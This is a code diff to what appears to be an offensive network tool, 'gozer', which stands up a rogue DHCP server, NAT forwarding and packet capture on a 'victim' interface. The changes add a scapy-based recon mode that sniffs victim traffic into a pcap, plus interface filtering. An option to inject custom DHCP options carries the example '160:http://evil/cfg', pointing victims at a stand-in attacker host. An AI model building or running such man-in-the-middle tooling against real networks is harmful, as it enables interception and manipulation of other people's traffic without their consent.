@@ -14,7 +14,8 @@ import ipaddress
 import threading
 import subprocess
 
-from dhcpd import DHCPServer
+from lib.dhcpd import DHCPServer
+from lib.recon import ReconEngine
 
 
 log = logging.getLogger('gozer')
@@ -54,6 +55,15 @@ def get_default_route():
     return None, None
 
 
+def is_virtual_or_wireless(ifname):
+    if os.path.isdir(f'/sys/class/net/{ifname}/wireless'):
+        return True
+    prefixes = ('vmnet', 'vboxnet', 'virbr', 'veth', 'docker', 'br-')
+    if any(ifname.startswith(p) for p in prefixes):
+        return True
+    return False
+
+
 def get_interfaces():
     out = run('ip -j link show', check=False)
     if not out:
@@ -62,7 +72,8 @@ def get_interfaces():
         links = json.loads(out)
         return [l['ifname'] for l in links
                 if l.get('ifname') != 'lo'
-                and 'LOOPBACK' not in l.get('flags', [])]
+                and 'LOOPBACK' not in l.get('flags', [])
+                and not is_virtual_or_wireless(l['ifname'])]
     except (json.JSONDecodeError, KeyError):
         return []
 
@@ -180,6 +191,11 @@ def cleanup(signum=None, frame=None):
         srv.stop()
         print('[*] dhcp stopped')
 
+    recon = _state.get('recon')
+    if recon:
+        recon.stop()
+        print('[*] recon stopped')
+
     for rule in reversed(_state.get('ipt_rules', [])):
         undo = rule.replace(' -A ', ' -D ', 1)
         subprocess.run(undo, shell=True, capture_output=True)
@@ -228,6 +244,8 @@ def main():
     p.add_argument('--pool-end', help='last IP in dhcp pool (default: .200)')
     p.add_argument('--no-capture', action='store_true', help='skip packet capture')
     p.add_argument('--capture-filter', metavar='BPF', help='bpf filter for tcpdump')
+    p.add_argument('--recon', action='store_true', help='passive recon mode (scapy-based traffic analysis)')
+    p.add_argument('--recon-only', action='store_true', help='recon only, skip DHCP/NAT setup')
     p.add_argument('--dhcp-option', action='append', metavar='N:V', help='inject custom dhcp option (e.g. 160:http://evil/cfg)')
     p.add_argument('-v', '--verbose', action='store_true')
     args = p.parse_args()
@@ -255,20 +273,43 @@ def main():
 
     print(f'[*] uplink:  {uplink}')
     print(f'[*] victim:  {victim}')
+
+    signal.signal(signal.SIGINT, cleanup)
+    signal.signal(signal.SIGTERM, cleanup)
+
+    # recon-only: no MitM, just passive sniff
+    if args.recon_only:
+        pcap = f'/tmp/gozer_recon_{victim}.pcap'
+        recon = ReconEngine(victim, pcap_path=pcap)
+        _state['recon'] = recon
+        recon.start()
+        print(f'[*] recon-only mode on {victim} (pcap: {pcap})')
+        print('[*] ctrl-c to stop')
+        try:
+            while True:
+                threading.Event().wait(1)
+        except KeyboardInterrupt:
+            cleanup()
+        return
+
     print(f'[*] subnet:  {net}')
     print(f'[*] server:  {server_ip}')
     print(f'[*] pool:    {pool_start} - {pool_end}')
     print(f'[*] dns:     {dns}')
 
-    signal.signal(signal.SIGINT, cleanup)
-    signal.signal(signal.SIGTERM, cleanup)
-
     setup_victim_ip(victim, f'{server_ip}/{net.prefixlen}')
     enable_forwarding()
     setup_nat(uplink, victim)
 
-    # TODO: option to pick tshark instead of tcpdump?
-    if not args.no_capture:
+    if args.recon:
+        pcap = f'/tmp/gozer_{victim}.pcap'
+        pool_lo = int(ipaddress.IPv4Address(pool_start))
+        pool_hi = int(ipaddress.IPv4Address(pool_end))
+        recon = ReconEngine(victim, pcap_path=pcap, pool_range=(pool_lo, pool_hi))
+        _state['recon'] = recon
+        recon.start()
+        print(f'[*] recon active (pcap: {pcap})')
+    elif not args.no_capture:
         start_capture(victim, args.capture_filter)
 
     extra = parse_dhcp_opts(args.dhcp_option)
@@ -289,7 +330,6 @@ def main():
     t = threading.Thread(target=srv.start, daemon=True)
     t.start()
 
-    # sit here until killed
     try:
         while t.is_alive():
             t.join(timeout=1)
